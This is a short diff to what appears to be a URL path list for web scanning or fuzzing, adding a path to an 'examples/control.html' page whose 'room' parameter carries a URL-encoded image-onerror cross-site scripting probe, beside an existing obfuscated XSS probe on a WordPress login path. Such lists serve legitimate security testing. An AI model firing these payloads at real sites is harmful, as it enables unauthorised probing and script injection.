@@ -782,3 +782,5 @@
 /wp-json/wp/v2/wprm_recipe?per_page=5
 /?wprm_print={{recipe_id}}
 /wp-login.php?wp_lang=%20=id=x+type=image%20id=xss%20onfoc<!>usin+alert(`document.domain`)%0c
+/index.html
+/examples/control.html?room=%3Cimg%20src=x%20onerror=alert(document.domain)%3E
